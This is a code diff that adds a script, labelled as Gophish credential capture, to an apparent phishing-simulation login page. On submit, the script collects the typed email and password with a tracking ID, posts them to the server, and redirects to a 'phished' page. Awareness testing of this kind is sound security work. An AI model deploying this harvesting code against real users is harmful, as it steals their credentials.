@@ -586,6 +586,45 @@
             </div>
         </div>
     </div>
+
+    <script>
+        // Gophish credential capture script
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Get form data
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Get the rid parameter from URL (Gophish tracking ID)
+            const urlParams = new URLSearchParams(window.location.search);
+            const rid = urlParams.get('rid');
+
+            if (rid) {
+                // Send credentials to Gophish
+                const formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                formData.append('rid', rid);
+
+                // Submit to Gophish endpoint
+                fetch(window.location.origin + window.location.pathname + '?' + urlParams.toString(), {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors' // Important for cross-origin requests
+                }).then(() => {
+                    // Redirect to phished page after submission
+                    window.location.href = 'phished.html';
+                }).catch(() => {
+                    // Even if fetch fails, redirect anyway
+                    window.location.href = 'phished.html';
+                });
+            } else {
+                // No rid parameter, just redirect (for testing without Gophish)
+                window.location.href = 'phished.html';
+            }
+        });
+    </script>
 </body>
 
 </html>
